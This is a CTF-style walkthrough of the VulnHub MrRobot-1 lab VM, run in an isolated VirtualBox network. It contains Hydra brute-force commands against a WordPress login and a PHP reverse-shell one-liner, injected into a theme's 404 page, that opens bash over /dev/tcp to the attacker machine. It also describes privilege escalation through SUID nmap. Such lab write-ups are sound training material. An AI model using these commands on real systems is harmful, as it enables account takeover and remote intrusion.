---
title: "MrRobot-1 VulnHub Challenge – Full Walkthrough"
date: 2024-01-11
draft: true
summary: "A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery."
---


# Contents

[1 Introduction 3](#_Toc155948911)

[1.1 File integrity 3](#_Toc155948912)

[1.2 Network 4](#_Toc155948913)

[1.3 Setting up a DHCP server 5](#_Toc155948914)

[2 Identifying the MrRobot VM 6](#_Toc155948915)

[2.1 Source Code 8](#_Toc155948916)

[2.2 First Key Found 8](#_Toc155948917)

[2.3 Files from the webserver 9](#_Toc155948918)

[2.4 Web Directory Enumeration 12](#_Toc155948919)

[2.5 BruteForce with Hydra 15](#_Toc155948920)

[2.5.1 Using Hydra to BruteForce the Username 16](#_Toc155948921)

[2.5.2 Using Hydra to BruteForce the Password 18](#_Toc155948922)

[2.6 Exploitation 20](#_Toc155948923)

[2.6.1 WordPress Plugin: Reverse Shell 21](#_Toc155948924)

[2.7 Second Key Found 23](#_Toc155948925)

[2.8 Gaining Root Access and Finding the Third Key 23](#_Toc155948926)

[3 Summary and Discussion 25](#_Toc155948927)

[References 27](#_Toc155948928)

# Introduction

After browsing through the Vulnhub challenges, I decided to go with a listed one from the exercise materials as there were a plethora of new challenges but not too many walkthroughs. Having spent 5 hours documenting the [www.badstore.net](http://www.badstore.net) challenge, I decided to swiftly find one to start, hence choosing the MrRobot-1 challenge:

[https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1%2C151/)

The challenge description states as follows:

*Based on the show, Mr. Robot.*

*This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.*

*The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.*

The exercise was started 10am, Thursday 11.01.2024, and concluded Friday 11.am. Between these I spent 9 hours working on the challenges, although a fair bit of time to research the challenge and to set up the machines in a safe enviroment.

## File integrity

![](/images/mrrobot1/1.jpg)

Downloading the VM-image, which is always a risk considering private people are making these challenges and may cause harm. However as it is a known challenge, I download the image. The verification for the image file is added as md5 and sha1 values, so atleast I can doublecheck the file integrity.

![A black background with white text

Description automatically generated](data:image/png;base64...)

Windows Defended most certainly did not like this file and removed it immediately, but upon restoring I checked the md5 hash-value of the file to verify it with the Vulnhub value.

![A computer screen shot of a program

Description automatically generated](data:image/png;base64...)

They do match, so I continue the exercise by importing the ova-image to my VirtualBox. Ideally for the future I would like to create a dedicated VM used for the training exercises, as despite the Vulnhub page is a respected and much used resource for ethical hacking, exploration and penetration testing, it is also community run and I am not sure how trustworthy every single file downloaded from their pages are.

## Network

As a bare minimum I start by installing the MrRobot ova-file as a VM in my VirtualBox, and setting the network adapter to an internal network with my Kali VM. I do not know if this is needed for the challenge, but at least I then will have a Kali VM connected to the MrRobot VM if needed for later, and it would be isolated in its own network.

![](data:image/png;base64...)![](data:image/png;base64...)

![](data:image/png;base64...)As we have not set up a DHCP server yet, the Kali machine does not have an IP address.

The IPv6 address is a link-local address, which means it's used for communication within the local network segment, typically not routable beyond that segment. It's a self-assigned address for the interface on the internal network.

## Setting up a DHCP server

![A black screen with white text

Description automatically generated](data:image/png;base64...)VirtualBox installation path:

![](data:image/png;base64...)Finding the VboxManage.exe file and running it to see the contents, although too large to add in this report.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)Within it we find a section about DHCP Management. To have some clarity of what we already have, we list the current information before starting to add a new server.

From this we see the only information avaliable is the Host-Only Ethernet Adapter.

![A black background with white text

Description automatically generated](data:image/png;base64...)Chosing a range for the Ips, and enabling a new server

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)Listing the DHCP servers again, we now have the new server for our internal VM network

![A computer screen shot of a computer

Description automatically generated](data:image/png;base64...)Starting the Kali VM box to see if it has been able to receive an IP

So the DHCP server is working. Initially upon investigating some parts of the challenge, some walkthroughs discussed the idea behind the MrRobot-challenge as a webserver, and that the IP is not know nor can we do much without accessing the webserver. So first step is to have some sort of connectivity to it, and I realized the Kali VM in connection with the internal network was a good idea.

# Identifying the MrRobot VM

When going through the resources, I did not see any login or password for the MrRobot Vm, nor any other information as such. Starting with a scan of the local subnet that my Kali VM is connected to – and which the MrRobot VM also atleast by its settings is connected to.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)

The scan shows 2 devices, of which one is the Kali VM. The other should then be the MrRobot VM as there are no other devices connected. Marked in green shows the Ipv4 address *192.168.3.3*. In addition, NMAP shows that two ports are open, 80 and 443, commonly used for http and https. A 3rd port, 22 for ssh is shown closed. That eliminates any easy way into ssh-ing into the target. I try to open the address in a browser to see if there is any information there.

![A computer keyboard with a black keypad and a blue x

Description automatically generated](data:image/png;base64...)

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)Trying the url with https:// also give the same result.

Going through the commands show videos which describes the MrRobot and fsociety’s ambitions and targets, as well as entertaining info in a rather visually pleasing and entertaining design. However, from the information there nothing seem obvious. I note that the last command, *join*, asks for the users email address as a promt. This could be investigated later, but for now I will focus on the source code and files more easily accessible.

## Source Code

From the sourcecode, several javascript files are avaliable, some with more data than others. Due to other information state there is not much to fetch from these, I note that they are there and move on.

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)

## First Key Found

![](data:image/png;base64...)

A robots.txt file is a standard used by websites to communicate with web crawlers and search engine bots. It serves as a set of instructions for these bots, telling them which parts of the website are off-limits for indexing or crawling. The robots.txt file helps website owners control how search engines access their content and prevents sensitive or private information from being indexed and displayed in search results.

In the context of the MrRobot-1 VM challenge, the first key was discovered in the robots.txt file. This file is often the first place security researchers and hackers look for hidden or restricted content on a website. By finding the key in this file, it suggests that the challenge designers intended to provide a clue or challenge related to website enumeration and understanding how web crawlers interact with websites.

The contents of key-1-of-3.txt file

![](data:image/png;base64...)

## Files from the webserver

![](data:image/png;base64...)

In the context of this exercise, the "wget -mpEk" command was used to download the entire MrRobot webpage and its associated content efficiently. This command had several options working together to ensure a comprehensive download. It mirrored the webpage by recursively retrieving linked pages and their content, such as images and CSS files (with the "m" and "p" options). The "E" option handled file extensions, while the "k" option converted links within HTML files for local use. This approach provided a complete snapshot of the webpage, enabling a thorough examination that led to the discovery of the hidden fsocity.dic file in the robots.txt file.

Although wget is a powerful command-line tool for such tasks, alternative methods exist. Browser extensions like "Save Page WE" (for Firefox) or "Download All Images" (for Chrome) offer a more user-friendly approach with one-click downloads. Graphical download managers such as "Internet Download Manager" and "Free Download Manager" provide intuitive interfaces. However, wget remains favored for automation and complex mirroring tasks due to its command-line efficiency and flexibility, making it essential for tasks like web scraping.

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)

The *grep -Rnwo . -e 'key'* command is used to search for the whole word 'key' within files in the current directory and its subdirectories. It recursively scans files, displays line numbers for matches, and only shows the matched 'key' values. This command is valuable for locating specific content in a batch of files.

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)As such I also find the first key file by using grep on the downloaded files.

![A computer screen shot of text

Description automatically generated](data:image/png;base64...)

It is clear to me that not all files are being downloaded with the above wget commands, as we don’t have access to the key-1-of-3.txt nor fsocity.dic files. Opening these directly in the browser, as done previously with the key, reveals the .dic file as a list of words. Attempts using cURL also failed to retrieve the two mentioned files, so for now use the path directly and download them manually.

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)

Looking at the fsocity.dic file, we find a rather large file with words. Using sort and counting the lines, without duplicates shows over 11000 unique words.

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)

![](data:image/png;base64...)Saving the unique results in its own file.

## Web Directory Enumeration

Web directory enumeration is a critical process in web security assessments, and it serves to identify hidden sub-directories associated with a target website. When I perform web directory enumeration, my primary objective is to uncover sub-directories that might not be directly linked from the website's main page. These hidden directories often contain sensitive information, configuration files, or potential vulnerabilities that could be exploited. By systematically listing these sub-directories, I gain insight into the website's structure, making it easier to assess its security posture and detect any misconfigurations or weaknesses that require attention. This process is a fundamental step in both security assessments and website administration tasks.

To conduct web directory enumeration, I employ the Nmap tool with the -script switch and specifically choose the http-enum script. Nmap, a versatile network scanning tool, allows me to discover open ports, services, and other crucial details about the target host. The http-enum script interacts with the web server by sending requests and analyzing responses to identify existing directories and resources. After completing the Nmap scan, I obtain a list of operational sub-directories associated with the target website. These directories are either displayed in the scan output or saved for further examination. This systematic approach not only helps in mapping the website's structure but also aids in uncovering potential vulnerabilities or hidden content that might be overlooked during a cursory assessment.

![A screenshot of a computer screen

Description automatically generated](data:image/png;base64...)

In terms of HTTP enumeration, the scan identified several potentially interesting paths and files. It found paths like "/admin/" and "/wp-login.php," indicating the possibility of an admin section and login page. The presence of "/robots.txt" indicated that there might be directives for web crawlers. Furthermore, the scan detected various paths related to WordPress, including versions 2.2, 2.5, 2.6, and 2.7, along with paths to the WordPress login page and upgrade page. The "/readme.html" file was marked as interesting, potentially containing relevant information.

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)Using the Nikto command also gave similar results

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)Testing the different listed items as extensions to the original URL, I come across a WordPress login page.

We have a possible wordlist, and a login page. Although we dont know if the username or the password is within the list, and so far neither have been found elsewhere on the webserver.

## BruteForce with Hydra

Hydra is a powerful and versatile password-cracking tool used for brute force attacks. It is designed to automate the process of trying multiple usernames and passwords to gain unauthorized access to various login systems, such as web applications, SSH, FTP, email, and more. Hydra essentially automates the repetitive task of attempting different username and password combinations until a valid one is found or until all possibilities have been exhausted.

Hydra is being used to perform a brute force attack on the WordPress login page located at "/wp-login.php." It attempts to find valid login credentials for the WordPress admin panel by systematically trying different username and password combinations. Hydra works by sending POST requests to the login page with various username and password pairs, as specified by the user.

By analyzing the POST request made when attempting to log in, Hydra can craft and send similar requests with different credentials to check for successful login attempts. This process continues until it either successfully logs in or exhausts all possible combinations. Hydra is a valuable tool for security professionals and penetration testers to assess the strength of login credentials and identify vulnerabilities in web applications and other systems.

![](data:image/png;base64...)I start with using BurpSuite to intercept what happends when I click the login button on the WordPress login page. The process for this was initially to open BurpSuite, chose the *Proxy* tab and launche the browser. In the browser I entered the address *http://192.168.3.3/wp-login.php*. Once I had filled in test credentials *user* and *password*, I turned *intercept* on.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)The result after clicking the *Log In* button was as follows.

### Using Hydra to BruteForce the Username

In order to guess usernames and passwords to access a WordPress site, we need to send a special request to the website's login page. If the website tells us that a username is invalid, we can keep trying different usernames. To do this, we have a list of possible words of interests in a file called *fsocity.dic.uniq*. We don't care about the passwords for now; we'll use the same password for all the attempts. Now a point to know about Wordpress is that if we enter a valid username in wordpress, it actually tells us in the *error* message if we have that username or not.

$ hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.3.3 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

(Tafani-Dereeper, 2017)

The hydra command with the given options is used for brute forcing usernames in an HTTP form. Here's a breakdown of the options:

-vV: These options make the command run in verbose mode, providing detailed output, and display version information about Hydra.

-L fsocity.dic.uniq: This option specifies the username list to be used for the brute force attack. It reads usernames from the "fsocity.dic.uniq" file.

-p wedontcare: Here, it sets a static password "wedontcare" for all the login attempts since the focus is on enumerating usernames and not passwords.

192.168.3.3: This is the IP address of the target machine that we're attempting to attack.

http-post-form: It indicates that Hydra should perform a brute force attack on an HTTP POST form.

'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username': This part specifies the target URL and form parameters. "/wp-login.php" is the path to the login page. "^USER^

Initially I ran the command as is, but to try to keep more control over the terminal, I added the option -q quiet and saved the results to a textfile *results.txt*

![A screenshot of a computer screen

Description automatically generated](data:image/png;base64...)

In the Hydra brute-force attack, I successfully discovered three valid words for the potential username "elliot." These words were "elliot," "ELLIOT," and "Elliot." This finding indicates the existence of the username "elliot" and provides multiple options for accessing the WordPress administration interface.

To progress with the password, I could attempt each of the discovered words in combination with the username "elliot" to log in to the WordPress admin interface (http://192.168.3.3/wp-admin/). Once logged in, I could further explore the website's content and potentially find clues or keys hidden within it. This successful password discovery is a crucial step in advancing through the challenge, as it grants me access to the WordPress environment and potentially uncovers additional vulnerabilities or hidden information.

### Using Hydra to BruteForce the Password

$ hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

(Tafani-Dereeper, 2017)

![A computer screen with white text

Description automatically generated](data:image/png;base64...)The modified command I used is as follows

The -l elliot flag specifies the username *elliot*, which is the target of the attack. The -P fsocity.dic.uniq flag indicates the password list to be used, which is the *fsocity.dic.uniq* file. The command uses the http-post-form module to define the login form parameters. It includes the login page path, login and password placeholders (^USER^ and ^PASS^), and a failure condition that checks for the presence of the text "is incorrect" in the response. This setup allows Hydra to systematically test passwords from the provided list against the username "elliot" and monitor the responses to determine if a valid password is found.

The results of the Hydra attack indicate that it successfully discovered the password for the "elliot" account, which is *ER28-0652*. This password can be used to log in to the WordPress administration interface. The attack ran at an average rate of 2257 tries per minute and took approximately three minutes to complete. The successful password discovery demonstrates the effectiveness of Hydra in finding weak credentials through brute force attacks, highlighting the importance of strong and unique passwords to protect online accounts and systems.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)And with those credentials, I successfully logged into the WordPress portal.

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)Looking through the different pages on the Administration Panels does not immidiately bring forth information in regard to the wanted 2nd and 3rd flag. It does however confirm the user elliot as an administrator and also a subscriber with the username *mich05654* and Name *krista Gordon*.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)Going through the pages there are limited information and mostly default themes and WordPress information. In the *Media* section I found links to several pictures used on in the layout of the webpage that I saw initially. I did not further explore the contents of the images with steganography tools, but it was a point saved for later.

## Exploitation

From several sources I noted that authors had gotten access to an admin bash shell to the WordPress Page in this challenge. Initially I researched wether or not to use WPScan to search for vulnerabilities, although that would require me at this point to connect my Kali VM to the internet and do some updates of the WPScan database. Wanting to refrain from breaking the connection and keeping the system isolated, I held off on this thought. Another exploit I found with getting access to a shell as a main goal, was a WordPress Plugin called Reverse Shell, and another WordPress Admin Shell Upload.

### WordPress Plugin: Reverse Shell

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)This plugin allows the user to upload a file that contains a reverse shell payload. The reverse shell payload typically includes code that connects back to the attacker’s machine, establishing a remote shell session. To exploit this vulnerability, we need to find a vulnerable WordPress installation, often one with outdated plugins or themes. When browsing through the Administration Menu on the page, I did notice a page within the themes section that had a 404.php page.

Using this php page and editing the code could be a solution, and running the code by visiting the page. I code used in a plugin as this were as follows, modified with my Mr Robot VMs IP.

<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.3.2/443 0>&1'");
?>

Seven Layers(2024)

![A screenshot of a cell phone

Description automatically generated](data:image/png;base64...)I attempted to make use of this, navigating to the 404 page of the template and inserting the code above the pre-existing code. This should initiate a bash shell back to my Kali VM with the ip 192.168.3.2 on the port 443.

![A screenshot of a computer

Description automatically generated](data:image/png;base64...)I opened up a terminal window, and initiated a netcat listener (-l) on port 443 with verbose (-v) output, allowing for incoming connections, typically used for setting up a listener on a specific port for various networking tasks.

To initiate the code, I opened a non existing page, and by doing so I had access to a shell

![](data:image/png;base64...)![](data:image/png;base64...)

## Second Key Found

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)Navigating in the shell brings me to the home folder where I find the following two files, *key-2-of-3.txt* and *password.raw-md5*. To open the key file we need to gain access to the user robot. Trying to see if the password file has a known hash-value by searching existing databases on a separate box connected to the internet. By a quick search, it suggested the MD5 Hash-value could be the list of letters in the english alphabet *abcdefghijklmnopqrstuvwxyz*

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)Attempting to log into robot with this password revealed the limitations of the initial shell, and I found a method from a user nwrzd (2019), to start a tty shell. From there we managed to open the second key text-file.

## Gaining Root Access and Finding the Third Key

The strategy employed for privilege escalation was to identify an executable file with the SUID (Set User ID) bit set, which can allow running commands with elevated privileges. The 'find' command was used to search for files with the SUID bit enabled, specified by the query parameter for file permissions (4000). This search generated a list of potential files, and among them, the executable 'nmap' was found.

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)

Previously, older versions of 'nmap' had an interactive mode that permitted executing shell commands within it. Luckily, the version on this system supported this feature. By entering the interactive mode and opening a new shell, I gained access with root privileges.

![A screen shot of a computer

Description automatically generated](data:image/png;base64...)

![A screenshot of a computer program

Description automatically generated](data:image/png;base64...)With root access, I performed a search for the third key using the phrase *key-3*, seeing how the previous two keys were named. Doing so I found the third key.

# Summary and Discussion

In this cyber security exercise, I tested the MrRobot-1 challenge, which was designed to test and enhance my penetration testing skills. The challenge consisted of finding three progressively difficult keys hidden in different locations within a virtual machine. This exercise aimed to simulate real-world scenarios, allowing me to practice various techniques and tools commonly used by ethical hackers and security professionals.

I began by ensuring the file integrity of the VM image and setting up a network connection with my Kali VM. Setting up a DHCP server allowed me to obtain an IP address for the MrRobot VM. After conducting a network scan, I discovered the target VM's IP address and open ports, including HTTP and HTTPS.

The first key was found in the robots.txt file, emphasizing the importance of web enumeration techniques. Web directory enumeration helped identify potential areas of interest, such as the WordPress login page. Using the powerful tool Hydra, I successfully conducted a brute-force attack on the WordPress login page, revealing valid usernames and passwords.

Exploitation became the focus, with an exploration of WordPress plugins like the Reverse Shell plugin. I managed to gain access to the MrRobot VM through a reverse shell payload, ultimately leading to the discovery of the second key.

Privilege escalation was achieved by identifying an executable file with the SUID bit set, granting root-level access. This allowed me to locate the third and final key, completing the challenge.

The exercise highlighted the significance of web enumeration, password security, and privilege escalation techniques. It reinforced the importance of maintaining strong and unique passwords to protect systems from brute-force attacks. Additionally, it showcased the power of tools like Hydra for automating password-cracking attempts and the importance of keeping web applications and plugins up-to-date to prevent potential exploitation. Several of the points taken and methods used were also similar to previous challenges with the BadStore.net, and it was interesting to see the similarities on some points, such as injecting code.

Overall, this exercise offered practical insights into real-world penetration testing scenarios, equipping me with essential skills and knowledge for future security challenges. It emphasized the significance of continuous learning and the critical role of ethical hacking in identifying and mitigating vulnerabilities to enhance overall cybersecurity.

References

Christophe Tafani-Dereeper, 2017. [Write Up] Mr Robot. https://blog.christophetd.fr/write-up-mr-robot

ZeusCybersec, Sept. 2021. TryHackMe-Mr Robot CTF Writeup. https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7

Nwrzd, Sept. 2019. Vulnhub.com : Mr-Robot: 1 Walkthrough. https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f

Seven Layers, 2024. WordPress Plugin: Reverse Shell. https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell